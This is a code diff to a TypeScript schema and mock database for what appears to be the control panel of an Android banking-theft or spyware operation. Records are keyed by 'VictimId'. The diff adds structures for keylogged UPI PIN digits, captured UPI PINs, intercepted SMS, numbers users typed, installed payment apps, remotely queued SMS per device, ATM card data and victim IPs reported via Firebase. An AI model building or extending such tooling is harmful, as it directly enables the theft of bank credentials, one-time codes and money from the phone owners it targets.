@@ -9,25 +9,33 @@ export interface DeviceInfo {
   SimNumber1?: string;
   SimNumber2?: string;
   IMEI?: string;
-  Battery?: string; // e.g., "82%"
+  Battery?: string; // e.g., "82%" (legacy)
+  BatteryLevel?: string; // e.g., "25%" (from Firebase)
   LastSync?: string; // dd-MM-yyyy HH:mm:ss
   WiFi?: string;
   StorageUsed?: string;
   // Extended fields for table + overview
   Status?: string; // e.g., "Online"
-  IPAddress?: string; // e.g., "Unknown" or "192.168.1.10"
+  IP?: string; // e.g., "27.60.180.56" (from Firebase)
+  IPAddress?: string; // e.g., "Unknown" or "192.168.1.10" (legacy)
   UPIPin?: string; // "No Pin" or masked
   Note?: string; // "-"
   Added?: string; // date/time or "-"
   AppsInstalled?: number; // 0..n
+  VictimId?: string; // Device identifier
+  Location?: string; // Device location
+  LastSeen?: string; // Last seen timestamp
 }
 
 export interface Message {
   VictimId: string;
   Sender: string;
+  Recipient?: string;
   Time: string; // dd-MM-yyyy HH:mm:ss
   Body: string;
+  Message?: string;
   SmsType: "INBOX" | "SENT" | string;
+  Type?: "Received" | "Sent" | string;
 }
 
 export interface SimRow { 
@@ -37,8 +45,36 @@ export interface SimRow {
 }
 
 export interface KeyLog { 
-  time: string; 
-  text: string; 
+  keylogger?: string; // e.g., "UPI_PIN"
+  timestamp?: string; // e.g., "22-05-2025 02:09:00"
+  Column1?: string;   // Individual key values
+  Column2?: string;
+  Column3?: string;
+  Column4?: string;
+  Column5?: string;
+  Column6?: string;
+  // Legacy support
+  time?: string; 
+  text?: string;
+}
+
+export interface UserEntered {
+  NumberEntered: string;
+  VictimID: string;
+  Time?: string; // dd-MM-yyyy HH:mm:ss
+}
+
+export interface SendSms {
+  Sender: string;
+  Message: string;
+  Time?: string; // dd-MM-yyyy HH:mm:ss
+  DeviceId?: string; // VictimId for reference
+}
+
+export interface AppsInstalled {
+  TotalApps: number;
+  AppsList?: string[];
+  LastUpdated?: string;
 }
 
 export interface ATMCard { 
@@ -52,7 +88,10 @@ export interface DBShape {
   Messages: Record<string, Message>;        // key = message id
   Sims: Record<string, SimRow[]>;           // key = VictimId
   KeyLogs: Record<string, KeyLog[]>;        // key = VictimId
-  UPIPins: Record<string, string[]>;        // key = VictimId
+  UPIPins: Record<string, Array<{ pin: string; timestamp: string }>>;        // key = VictimId
+  UserEntered: Record<string, UserEntered>; // key = entry id
+  AppsInstalled: Record<string, AppsInstalled>; // key = VictimId
+  SendSms: Record<string, Record<string, SendSms>>; // key = AddKey (manufacturer + model), then message id
   ATMCards: Record<string, ATMCard[]>;      // key = VictimId
 }
 
@@ -197,28 +236,107 @@ export const DB: DBShape = {
   },
   KeyLogs: {
     "VICTIM-01": [
-      { time: "13-08-2025 12:45:10", text: "otp 839271" },
-      { time: "13-08-2025 11:30:22", text: "password123" },
-      { time: "13-08-2025 10:15:45", text: "mybank@123" }
+      { 
+        timestamp: "13-08-2025 12:45:10", 
+        Column1: "1", 
+        Column2: "2", 
+        Column3: "3", 
+        Column4: "4", 
+        Column5: "5", 
+        Column6: "6" 
+      },
+      { 
+        timestamp: "13-08-2025 11:30:22", 
+        Column1: "7", 
+        Column2: "8", 
+        Column3: "9", 
+        Column4: "0", 
+        Column5: "1", 
+        Column6: "2" 
+      },
+      { 
+        timestamp: "13-08-2025 10:15:45", 
+        Column1: "3", 
+        Column2: "4", 
+        Column3: "5", 
+        Column4: "6", 
+        Column5: "7", 
+        Column6: "8" 
+      }
     ],
     "VICTIM-02": [
-      { time: "12-08-2025 19:30:15", text: "amazon password" },
-      { time: "12-08-2025 18:45:33", text: "flipkart login" }
+      { 
+        timestamp: "12-08-2025 19:30:15", 
+        Column1: "9", 
+        Column2: "0", 
+        Column3: "1", 
+        Column4: "2", 
+        Column5: "3", 
+        Column6: "4" 
+      },
+      { 
+        timestamp: "12-08-2025 18:45:33", 
+        Column1: "5", 
+        Column2: "6", 
+        Column3: "7", 
+        Column4: "8", 
+        Column5: "9", 
+        Column6: "0" 
+      }
     ],
     "VICTIM-03": [],
     "VICTIM-04": [
-      { time: "13-08-2025 14:20:10", text: "upi pin 2456" }
+      { 
+        timestamp: "13-08-2025 14:20:10", 
+        Column1: "2", 
+        Column2: "4", 
+        Column3: "5", 
+        Column4: "6", 
+        Column5: "7", 
+        Column6: "8" 
+      }
     ],
     "VICTIM-05": [
-      { time: "13-08-2025 09:45:33", text: "whatsapp code 456789" }
+      { 
+        timestamp: "13-08-2025 09:45:33", 
+        Column1: "4", 
+        Column2: "5", 
+        Column3: "6", 
+        Column4: "7", 
+        Column5: "8", 
+        Column6: "9" 
+      }
     ]
   },
   UPIPins: {
-    "VICTIM-01": ["No Pin"],
-    "VICTIM-02": ["****", "****"],
-    "VICTIM-03": ["No Pin"],
-    "VICTIM-04": ["****"],
-    "VICTIM-05": ["No Pin"]
+    "VICTIM-01": [{ pin: "No Pin", timestamp: "13-08-2025 15:20:00" }],
+    "VICTIM-02": [{ pin: "****", timestamp: "12-08-2025 18:00:00" }, { pin: "****", timestamp: "12-08-2025 18:30:00" }],
+    "VICTIM-03": [{ pin: "No Pin", timestamp: "11-08-2025 21:00:00" }],
+    "VICTIM-04": [{ pin: "****", timestamp: "13-08-2025 16:00:00" }],
+    "VICTIM-05": [{ pin: "No Pin", timestamp: "13-08-2025 13:00:00" }]
+  },
+  UserEntered: {
+    "USER-001": { NumberEntered: "123456", VictimID: "VICTIM-01", Time: "13-08-2025 15:20:00" },
+    "USER-002": { NumberEntered: "789012", VictimID: "VICTIM-02", Time: "12-08-2025 18:00:00" },
+    "USER-003": { NumberEntered: "345678", VictimID: "VICTIM-03", Time: "11-08-2025 21:00:00" },
+    "USER-004": { NumberEntered: "901234", VictimID: "VICTIM-04", Time: "13-08-2025 16:00:00" },
+    "USER-005": { NumberEntered: "567890", VictimID: "VICTIM-05", Time: "13-08-2025 13:00:00" }
+  },
+  AppsInstalled: {
+    "VICTIM-01": { TotalApps: 45, AppsList: ["WhatsApp", "Gmail", "Chrome", "PayTM"], LastUpdated: "13-08-2025 14:30:00" },
+    "VICTIM-02": { TotalApps: 32, AppsList: ["Instagram", "Facebook", "Amazon", "Flipkart"], LastUpdated: "12-08-2025 19:00:00" },
+    "VICTIM-03": { TotalApps: 18, AppsList: ["WhatsApp", "YouTube"], LastUpdated: "11-08-2025 22:00:00" },
+    "VICTIM-04": { TotalApps: 28, AppsList: ["PhonePe", "Google Pay", "SBI Yono"], LastUpdated: "13-08-2025 16:00:00" },
+    "VICTIM-05": { TotalApps: 15, AppsList: ["WhatsApp", "Telegram"], LastUpdated: "13-08-2025 13:00:00" }
+  },
+  SendSms: {
+    "POCO Xiaomi 23076PC4BI": {
+      "MSG-001": { Sender: "+918972123456", Message: "Test message 1", Time: "13-08-2025 15:30:00", DeviceId: "Xiaomi 23076PC4BI" },
+      "MSG-002": { Sender: "+918972654321", Message: "Test message 2", Time: "13-08-2025 16:00:00", DeviceId: "Xiaomi 23076PC4BI" }
+    },
+    "samsung SM-A037F": {
+      "MSG-003": { Sender: "+919876543210", Message: "Samsung test message", Time: "13-08-2025 14:00:00", DeviceId: "samsung SM-A037F" }
+    }
   },
   ATMCards: {
     "VICTIM-01": [
